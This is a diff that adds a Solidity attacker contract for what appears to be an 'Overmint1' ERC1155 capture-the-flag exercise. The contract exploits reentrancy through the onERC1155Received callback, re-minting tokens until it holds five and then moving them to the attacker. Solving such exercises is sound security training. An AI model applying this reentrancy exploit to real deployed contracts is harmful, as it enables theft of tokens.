@@ -22,3 +22,37 @@ contract Overmint1_ERC1155 is ERC1155 {
         return balanceOf(_attacker, id) == 5;
     }
 }
+
+contract Overmint1_ERC1155_Attacker {
+    Overmint1_ERC1155 public victim;
+    address attacker;
+
+    constructor(address victimContract) {
+        victim = Overmint1_ERC1155(victimContract);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        victim.mint(0, "");
+    }
+
+    function onERC1155Received(
+        address operator,
+        address from,
+        uint256 id,
+        uint256 value,
+        bytes calldata data
+    ) external returns (bytes4) {
+        require(msg.sender == address(victim), "not victim");
+
+        uint256 balance = victim.balanceOf(address(this), id);
+
+        if (balance < 5) {
+            victim.mint(id, "");
+        } else {
+            victim.safeTransferFrom(address(this), attacker, id, balance, "");
+        }
+
+        return this.onERC1155Received.selector;
+    }
+}
